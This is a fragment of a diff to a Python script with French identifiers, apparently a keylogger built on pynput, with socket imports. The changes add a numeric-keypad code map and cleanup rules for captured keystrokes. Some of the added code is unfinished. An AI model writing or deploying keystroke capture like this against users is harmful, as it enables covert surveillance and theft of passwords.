@@ -4,7 +4,9 @@ import argparse
 import socket
 import time
 import threading
+import  re
 from pynput.keyboard import Key, Listener
+
 
 def argument():
     p = argparse.ArgumentParser(description='Ajouter description')
@@ -18,15 +20,34 @@ def argument():
 
 TXT_GLOB = ""
 
+def pav_num(nombre):
+    touche = {}
+    touche = {
 
+        "< 96 >": 0,
+        "< 97 >": 1,
+        "< 98 >": 2,
+        "< 99 >": 3,
+        "< 100 >": 4,
+        "< 101 >": 5,
+        "< 102 >": 6,
+        "< 103 >": 7,
+        "< 104 >": 8,
+        "< 105 >": 9,
+    }
 def kill_all() :
     print( "tout tuer ")
 
-def parse(str):
-    new_str = str.replace("'", "")
+def parse(srt):
+
+    pattern = r'<\d+>'
+
+    new_str = srt.replace("'", "")
     new_str = new_str.replace("Key.space"," ")
     new_str = new_str.replace("Key.backspace","<-")
     new_str = new_str.replace("Key.enter","\n")
+    new_str = new_str.replace("Key.shift_r", "")
+
     return new_str
 
 def kpr(key):
